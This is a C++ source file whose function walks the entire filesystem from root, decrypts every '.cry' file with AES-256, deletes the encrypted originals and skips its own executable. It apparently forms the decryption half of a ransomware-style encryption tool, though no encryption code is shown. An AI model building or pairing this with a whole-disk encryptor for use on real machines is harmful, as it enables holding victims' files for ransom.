#include "FileSystemDecryptor.hpp"

void FileSystemDecryptor::decryptFileSystem(const char* exeName) {
    std::string startDir("/"); // Using default for now
    try {
        if (!fs::exists(startDir) || !fs::is_directory(startDir)) {
            printf("Not a dir or doesnt exist\n");
            return;
        } 
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return;
    } catch (const std::exception& e) {
        std::cerr << "General error: " << e.what() << std::endl;
        return;
    }
    CryptoManager cryptoManager("AES-256"); // TODO: Implement way for program to know what the startDir and enc algo is
    int count = 0;
    for (const auto& entry : fs::recursive_directory_iterator(startDir, fs::directory_options::skip_permission_denied)) {
        try {
            if (fs::is_regular_file(entry.status())) {
                if (!GeneralUtils::cStrAreEqual(entry.path().string().c_str(), exeName)) { // TODO: change to actual executable file name
                    printf("Filename: %s\n", entry.path().c_str());
                    try {
                        if (entry.path().extension() == ".cry") {
                                cryptoManager.decryptFile(entry.path().string());
                                fs::remove(entry.path());
                                count++;
                        }
                    } catch (const std::exception& e) {
                        continue;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
           continue;
        } catch (const std::exception& e) {
            continue;
        }
    }
    std::ostringstream oss;
    oss << count << " file(s) decrypted";
    printf("%s\n", oss.str().c_str());
}
